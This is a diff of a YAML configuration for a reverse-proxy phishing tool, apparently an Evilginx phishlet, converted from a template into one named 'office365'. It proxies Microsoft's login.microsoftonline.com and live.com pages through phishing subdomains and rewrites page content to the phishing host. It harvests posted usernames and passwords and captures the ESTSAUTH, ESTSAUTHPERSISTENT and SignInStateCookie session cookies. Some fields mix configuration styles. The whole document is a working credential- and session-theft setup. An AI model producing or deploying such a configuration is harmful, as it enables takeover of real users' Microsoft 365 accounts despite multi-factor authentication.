@@ -1,20 +1,31 @@
-min_ver: '3.0.0'
+name: 'office365'
+min_ver: '3.2.0'
+
 proxy_hosts:
-  - {phish_sub: 'academy', orig_sub: 'academy', domain: 'breakdev.org', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'microsoftonline.com', session: false}
+  - {phish_sub: 'account', orig_sub: 'login', domain: 'live.com', session: false}
+
 sub_filters:
-  - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
+  - {hostname: '{hostname}', sub: 'login', domain: 'microsoftonline.com', search: 'microsoftonline.com', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json']}
+
 auth_tokens:
-  - domain: '.academy.breakdev.org'
-    keys: ['cookie_name']
-credentials:
-  username:
-    key: 'email'
-    search: '(.*)'
+  - domain: 'microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+
+creds:
+  - key: 'username'
+    search: ['(.*)']
     type: 'post'
-  password:
-    key: 'password'
-    search: '(.*)'
+  - key: 'password'
+    search: ['(.*)']
     type: 'post'
+
+auth_urls:
+  - url_regex: 'https://{hostname}/kmsi'
+    valid_statuses: [200, 302]
+
 login:
-  domain: 'academy.breakdev.org'
-  path: '/evilginx-mastery'
+  username: user
+  password: pass
+  url: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize'
